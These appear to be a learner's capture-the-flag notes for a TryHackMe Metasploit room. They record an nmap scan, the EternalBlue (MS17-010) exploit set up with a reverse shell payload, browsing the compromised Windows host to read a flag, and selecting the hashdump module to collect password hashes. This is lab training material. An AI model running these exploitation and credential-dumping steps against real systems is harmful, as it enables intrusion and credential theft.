# https://tryhackme.com/room/metasploitexploitation

db_nmap -sV -p- <HOST-IP>

[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows


HINT: MS17-010

search MS17-010
use 0
info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14

Provided by:
  Equation Group
  Shadow Brokers
  sleepya
  Sean Dillon <sean.dillon@risksense.com>
  Dylan Davis <dylan.davis@risksense.com>
  thelightcosine
  wvu <wvu@metasploit.com>
  agalway-r7
  cdelafuente-r7
  cdelafuente-r7
  agalway-r7

Available targets:
  Id  Name
  --  ----
  0   Automatic Target
  1   Windows 7
  2   Windows Embedded Standard 7
  3   Windows Server 2008 R2
  4   Windows 8
  5   Windows 8.1
  6   Windows Server 2012
  7   Windows 10 Pro
  8   Windows 10 Enterprise Evaluation

Check supported:
  Yes

Basic options:
  Name           Current Setting  Required  Description
  ----           ---------------  --------  -----------
  RHOSTS         10.10.234.5      yes       The target host(s), see https:/
                                            /github.com/rapid7/metasploit-f
                                            ramework/wiki/Using-Metasploit
  RPORT          445              yes       The target port (TCP)
  SMBDomain                       no        (Optional) The Windows domain t
                                            o use for authentication. Only
                                            affects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded St
                                            andard 7 target machines.
  SMBPass                         no        (Optional) The password for the
                                             specified username
  SMBUser                         no        (Optional) The username to auth
                                            enticate as
  VERIFY_ARCH    true             yes       Check if remote architecture ma
                                            tches exploit Target. Only affe
                                            cts Windows Server 2008 R2, Win
                                            dows 7, Windows Embedded Standa
                                            rd 7 target machines.
  VERIFY_TARGET  true             yes       Check if remote OS matches expl
                                            oit Target. Only affects Window
                                            s Server 2008 R2, Windows 7, Wi
                                            ndows Embedded Standard 7 targe
                                            t machines.

Payload information:
  Space: 2000

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
  Actual RIP hijack is later completed in 
  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
  not trigger 100% of the time, and should be run continuously until 
  triggered. It seems like the pool will get hot streaks and need a 
  cool down period before the shells rain in again. The module will 
  attempt to use Anonymous login, by default, to authenticate to 
  perform the exploit. If the user supplies credentials in the 
  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
  On some systems, this module may cause system instability and 
  crashes, such as a BSOD or a reboot. This may be more likely with 
  some payloads.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
  https://github.com/RiskSense-Ops/MS17-010
  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
  https://www.exploit-db.com/exploits/42030

Also known as:
  ETERNALBLUE


show payloads

Compatible Payloads
===================

   #   Name                                                Disclosure Date  Rank    Check  Description
   -   ----                                                ---------------  ----    -----  -----------
   0   payload/generic/custom                                               normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/windows/x64/exec                                             normal  No     Windows x64 Execute Command
   4   payload/windows/x64/loadlibrary                                      normal  No     Windows x64 LoadLibrary Path
   5   payload/windows/x64/messagebox                                       normal  No     Windows MessageBox x64
   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)


set payload 2
set RHOSTS <HOST-IP>
set LHOST <VPN-IP>
# CHECK PORTS

run

C:\Windows\system32>

C:\Windows\system32>dir
C:\Windows\system32>cd ../..
C:\Windows\system32>dir 

 Volume in drive C has no label.                                             
 Volume Serial Number is E611-0B66                                           
                                                                             
 Directory of C:\                                                            
                                                                             
07/13/2009  09:20 PM    <DIR>          PerfLogs                              
04/12/2011  02:28 AM    <DIR>          Program Files                         
03/17/2019  04:28 PM    <DIR>          Program Files (x86)
12/12/2018  09:13 PM    <DIR>          Users
03/17/2019  04:36 PM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  39,813,410,816 bytes free


C:\>cd Users
C:\Users\>dir

 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users

12/12/2018  09:13 PM    <DIR>          .
12/12/2018  09:13 PM    <DIR>          ..
12/12/2018  09:13 PM    <DIR>          Jon
04/12/2011  02:28 AM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  39,813,410,816 bytes free

C:\Users\>cd Jon
C:\Users\Jon>dir

 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon

12/12/2018  09:13 PM    <DIR>          .
12/12/2018  09:13 PM    <DIR>          ..
12/12/2018  09:13 PM    <DIR>          Contacts
12/12/2018  09:49 PM    <DIR>          Desktop
07/14/2021  08:39 PM    <DIR>          Documents
12/12/2018  09:13 PM    <DIR>          Downloads
12/12/2018  09:13 PM    <DIR>          Favorites
12/12/2018  09:13 PM    <DIR>          Links
12/12/2018  09:13 PM    <DIR>          Music
12/12/2018  09:13 PM    <DIR>          Pictures
12/12/2018  09:13 PM    <DIR>          Saved Games
12/12/2018  09:13 PM    <DIR>          Searches
12/12/2018  09:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  39,813,410,816 bytes free


C:\Users\Jon>cd Documents
C:\Users\Jon\Documents>dir

 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

07/14/2021  08:39 PM    <DIR>          .
07/14/2021  08:39 PM    <DIR>          ..
07/14/2021  08:39 PM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  39,813,410,816 bytes free

C:\Users\Jon\Documents>more flag.txt
THM-5455554845


Ctrl^Z - Session Background


HINT - Use hashdump

search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   1   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   2   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   3   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   4   auxiliary/gather/ldap_hashdump                        2020-07-23       normal  No     LDAP Information Disclosure
   5   post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   6   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   8   post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   9   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   10  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   11  auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   12  auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   13  auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   14  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   15  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   16  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   17  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   18  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


use 17

info

       Name: Windows Gather Local User Account Password Hashes (Registry)
     Module: post/windows/gather/hashdump
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  hdm <x@hdm.io>

Compatible session types:
  Meterpreter

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on

Description:
  This module will dump the local user accounts from the SAM database 
  using the registry




